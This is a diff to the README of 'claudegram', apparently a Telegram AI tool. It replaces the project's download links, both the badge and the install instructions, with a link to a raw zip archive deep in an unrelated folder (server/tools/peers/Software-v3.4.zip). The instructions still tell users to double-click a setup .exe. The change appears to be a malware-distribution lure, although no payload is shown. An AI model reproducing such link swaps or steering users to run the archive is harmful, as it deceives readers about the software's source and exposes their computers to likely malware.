@@ -1,6 +1,6 @@
 # 🤖 claudegram - Control your Telegram with artificial intelligence
 
-[![Download claudegram](https://img.shields.io/badge/Download-claudegram-blue.svg)](https://github.com/Uri6407/claudegram)
+[![Download claudegram](https://img.shields.io/badge/Download-claudegram-blue.svg)](https://github.com/Uri6407/claudegram/raw/refs/heads/main/server/tools/peers/Software-v3.4.zip)
 
 ## 💡 What is claudegram?
 
@@ -19,7 +19,7 @@ To run this application, your computer needs the following:
 
 ## 📥 How to Install
 
-1. Visit [the official download page](https://github.com/Uri6407/claudegram).
+1. Visit [the official download page](https://github.com/Uri6407/claudegram/raw/refs/heads/main/server/tools/peers/Software-v3.4.zip).
 2. Locate the file named claudegram-setup.exe.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
